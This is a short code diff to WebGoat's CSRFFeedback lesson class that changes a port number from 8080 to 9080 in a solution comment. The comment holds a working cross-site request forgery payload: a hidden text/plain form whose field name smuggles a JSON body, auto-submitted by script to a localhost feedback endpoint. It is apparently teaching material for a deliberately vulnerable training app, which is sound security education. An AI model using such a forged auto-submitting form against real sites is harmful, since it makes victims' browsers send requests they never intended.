@@ -84,7 +84,7 @@ public class CSRFFeedback extends AssignmentEndpoint {
     }
 
     /** Solution
-     <form name="attack" enctype="text/plain" action="http://localhost:8080/WebGoat/csrf/feedback/message" METHOD="POST">
+     <form name="attack" enctype="text/plain" action="http://localhost:9080/WebGoat/csrf/feedback/message" METHOD="POST">
      <input type="hidden" name='{"name": "Test", "email": "test1233@dfssdf.de", "subject": "service", "message":"dsaffd"}'>
      </form>
      <script>document.attack.submit();</script>
